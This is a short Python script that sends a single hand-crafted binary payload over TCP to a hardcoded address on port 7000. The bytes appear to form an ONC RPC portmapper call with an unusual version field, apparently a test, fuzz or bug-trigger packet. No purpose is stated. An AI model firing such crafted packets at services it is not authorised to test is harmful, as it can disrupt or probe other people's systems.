#!/usr/bin/env python3
import socket
import sys

payload = b'\x80\x00\x00(r\xfe\x1d\x13\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa0\x00\x01\x97|\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect the socket to the port where the server is listening
server_address = ('191.1.1.2', 7000)
print('connecting to {} port {}'.format(*server_address))
sock.connect(server_address)

try:
    # Send data
    sock.sendall(payload)
finally:
    print('closing socket')
    sock.close()
